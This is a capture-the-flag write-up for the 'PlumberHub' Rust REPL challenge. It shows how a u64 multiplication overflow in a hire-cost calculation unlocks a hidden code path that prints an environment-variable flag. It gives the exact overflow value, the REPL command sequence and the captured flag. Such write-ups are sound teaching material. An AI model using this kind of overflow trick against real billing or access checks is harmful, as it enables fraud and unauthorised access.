---
layout: post
title: "SHC 2026: PlumberHub - Rust Integer Overflow for Fun and Flags"
date: 2026-05-08
tags: [misc]
---

## Challenge Overview

A Rust-based interactive REPL accessible via telnet. Given a `Cargo.lock`.
Goal: extract a flag stored in an environment variable.

## Reconnaissance

`Cargo.lock` revealed suspicious packages:
- `zmij` — substituted for `ryu` inside a patched `serde_json`
- `serde_core` — fake split of the real `serde` crate

Legitimate but revealing dependencies:
- `clap + clap-repl + reedline` — interactive REPL
- `smol` — async executor
- `rand` with chacha20 backend — seeded RNG
- `async-recursion` — recursive async work list processing

**Note:** Raw `nc` failed — `reedline` requires a TTY. Use `telnet` instead.

## Finding the Flag (contractor.rs)

```rust
plumbing::InstallationKind::EldritchPresence => {
    if self.years_experience >= AGE_OF_THE_UNIVERSE {  // 13_790_000_000
        smol::Timer::after(...).await;
        summary.push("i have unblocked your destined path, my child");
        summary.push("go on, take this, and be free from hence on");
        summary.push(std::env::var(&installation.name).unwrap_or_default());
        // ^^^ reads the ENV VAR named by installation.name — that's the flag!
    } else {
        panic!("helphèlp...");
    }
}
```

**EldritchPresence** was hidden from tab completion — intentionally obscure.

## The Money Problem

Hire cost calculation:

```rust
let cost = 100 + years_experience as u64 * 80;
```

For `years_experience = 13_790_000_000`:

```
cost = 100 + 13_790_000_000 * 80 = 1_103_200_000_100
```

Starting budget: only `15_000$`. Instantly bankrupt.

## The Exploit: u64 Integer Overflow

Rust release builds **wrap on overflow** — no panic. Find a value where:
- `years_experience >= 13_790_000_000` (passes the age check)
- `years_experience as u64 * 80` wraps to near zero (affordable)

```
u64::MAX = 18_446_744_073_709_551_615
Overflow point = 18_446_744_073_709_551_616 / 80 = 230_584_300_921_369_395.2
```

Using `years_experience = 230_584_300_921_369_396`:

```
230_584_300_921_369_396 * 80 mod 2^64
= 18_446_744_073_709_551_680 mod 18_446_744_073_709_551_616
= 64

cost = 100 + 64 = 164$   — affordable!
```

## Final Exploit

```
hire-contractor 230584300921369396
delegate-work task1 1 230584300921369396
clear-obstruction eldritch-presence FLAG
wait-for-delegated-work task1
run
```

**Output:**

```
i have unblocked your destined path, my child
go on, take this, and be free from hence on
dach2026{help_i_leaked_the_drain_come_asap_fghkjjsdfentrkhksd_a61a4350eb50}
```

## Key Lessons

- **Read all code paths** — EldritchPresence was hidden from autocomplete but present in the enum
- **Rust overflows silently in release builds** — arithmetic wraps, no panic
- **Follow the money** — the billing system was the real constraint
- **Nested async delegation** was a red herring that almost worked — overflow was the intended path
